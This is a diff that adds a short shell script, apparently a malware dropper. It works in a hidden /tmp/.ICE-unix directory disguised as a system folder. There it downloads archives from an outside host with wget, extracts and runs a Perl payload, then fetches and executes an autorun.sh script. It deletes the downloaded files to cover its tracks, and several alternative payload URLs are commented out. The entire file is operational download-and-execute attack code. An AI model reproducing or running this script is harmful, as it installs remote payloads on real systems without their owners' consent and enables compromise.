@@ -1,0 +1,21 @@
+#!/bin/sh
+cd /tmp
+rm -rf .ICE-unix;
+mkdir .ICE-unix;
+cd .ICE-unix;rm -rf .* *
+#wget -O nets.hk.tgz http://x-up.ws/i/3715d0406ebf.zip
+#wget -O nets.hk.tgz http://x-up.ws/i/6e67ae6b36d3.zip
+wget -O nets.hk.tgz  http://x-up.ws/i/9c03b914cc9c.zip
+tar -xvf nets.hk.tgz
+rm -rf nets.hk.tgz
+perl nets.hk.txt
+perl nets.hk.txt
+mv nets.hk.txt .ICE-unix
+rm -rf nets.hk.txt* *
+#wget -O autorun.sh https://x-up.ws/i/45766e1e3568.zip
+#wget -O autorun.sh --no-check-certificate https://x-up.ws/i/ec4732024ca5.zip
+wget -O autorun.sh http://x-up.ws/i/0eb4208e6231.zip
+chmod +x autorun.sh
+sh autorun.sh
+rm -fr autorun.sh
+
